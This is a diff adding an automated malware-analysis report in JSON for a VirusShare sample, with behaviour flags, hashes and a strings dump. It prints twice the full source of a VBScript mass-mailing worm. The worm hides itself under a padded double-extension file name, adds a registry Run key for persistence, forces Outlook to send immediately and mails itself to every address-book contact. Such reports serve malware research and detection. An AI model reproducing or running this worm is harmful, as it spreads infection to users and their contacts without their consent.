@@ -1,0 +1,70 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "Run": "May run an executable file or a system command",
+            "WScript.shell": "May run an executable file or a system command",
+            "createobject": "May create an OLE object",
+            "shell": "May run an executable file or a system command",
+            "system": "May run an executable file or a system command on a Mac",
+            "windows": "May enumerate application windows"
+        },
+        "macro": "option explicit\n dim  myapp,myname,myaddlists,myaddlist,myentries,myentry,myatts,fso,mymail,regedit\n install\n send\n sub install()\n  set regedit=createobject(\"WScript.shell\")\n  set myapp=createobject(\"Outlook.application\")\n  set myname=myapp.getnamespace(\"MAPI\")\n  Set fso = CreateObject (\"Scripting.FileSystemObject\")\n  fso.GetFile(WScript.ScriptFullName).Copy(\"c:\\windows\\system\\funnystories.txt                                                  .vbs\")\n  fso.getfile(wScript.scriptfullname).copy(\"c:\\windows\\system\\fun.dll.vbs\")\n  on error resume next\n  regedit.regwrite \"HKCU\\Software\\Microsoft\\Office\\9.0\\Outlook\\Options\\mail\\Send Mail Immediately\",1,\"REG_DWORD\"\n  regedit.regwrite \"HKCU\\Software\\Microsoft\\Office\\8.0\\Outlook\\Options\\mail\\Send Mail Immediately\",1,\"REG_DWORD\"\n  regedit.regwrite \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Fundll\",\"c:\\windows\\system\\fun.dll.vbs\"\n end sub\n \n sub send()\n   set myaddlists=myname.addresslists \n   for each myaddlist in myaddlists\n   set myentries=myaddlist.Addressentries\n   for each myentry in myentries\n    set mymail=myapp.createitem(0)\n     mymail.to=myentry.address\n\t mymail.subject=\"Funny...Funny...Funny...stories\"\n\t mymail.body=\"Here are some funny stories and I hope you'll enjoy them. Have a good time! Bye\"\n\t set myatts=mymail.attachments\n\t myatts.add \"c:\\windows\\system\\funnystories.txt                                                  .vbs\",1,1\n     mymail.send\n   next\n  next\n end sub\n \n\n"
+    },
+    "filename": "VirusShare_218fe3248d7fe56749c00af8b4b7ea97",
+    "filesize": 1495,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "218fe3248d7fe56749c00af8b4b7ea97",
+        "sha1": "4b21953af3f62ce89f32db09e6c71d265ddcec66",
+        "sha256": "bd4c69594b29543d7f8380e28a34356496db003836f7a83e908e0696e7cb1168"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "option explicit",
+            " dim  myapp,myname,myaddlists,myaddlist,myentries,myentry,myatts,fso,mymail,regedit",
+            " install",
+            " send",
+            " sub install()",
+            "  set regedit=createobject(\"WScript.shell\")",
+            "  set myapp=createobject(\"Outlook.application\")",
+            "  set myname=myapp.getnamespace(\"MAPI\")",
+            "  Set fso = CreateObject (\"Scripting.FileSystemObject\")",
+            "  fso.GetFile(WScript.ScriptFullName).Copy(\"c:\\windows\\system\\funnystories.txt                                                  .vbs\")",
+            "  fso.getfile(wScript.scriptfullname).copy(\"c:\\windows\\system\\fun.dll.vbs\")",
+            "  on error resume next",
+            "  regedit.regwrite \"HKCU\\Software\\Microsoft\\Office\\9.0\\Outlook\\Options\\mail\\Send Mail Immediately\",1,\"REG_DWORD\"",
+            "  regedit.regwrite \"HKCU\\Software\\Microsoft\\Office\\8.0\\Outlook\\Options\\mail\\Send Mail Immediately\",1,\"REG_DWORD\"",
+            "  regedit.regwrite \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Fundll\",\"c:\\windows\\system\\fun.dll.vbs\"",
+            " end sub",
+            " sub send()",
+            "   set myaddlists=myname.addresslists ",
+            "   for each myaddlist in myaddlists",
+            "   set myentries=myaddlist.Addressentries",
+            "   for each myentry in myentries",
+            "    set mymail=myapp.createitem(0)",
+            "     mymail.to=myentry.address",
+            "\t mymail.subject=\"Funny...Funny...Funny...stories\"",
+            "\t mymail.body=\"Here are some funny stories and I hope you'll enjoy them. Have a good time! Bye\"",
+            "\t set myatts=mymail.attachments",
+            "\t myatts.add \"c:\\windows\\system\\funnystories.txt                                                  .vbs\",1,1",
+            "     mymail.send",
+            "   next",
+            "  next",
+            " end sub"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.267227",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
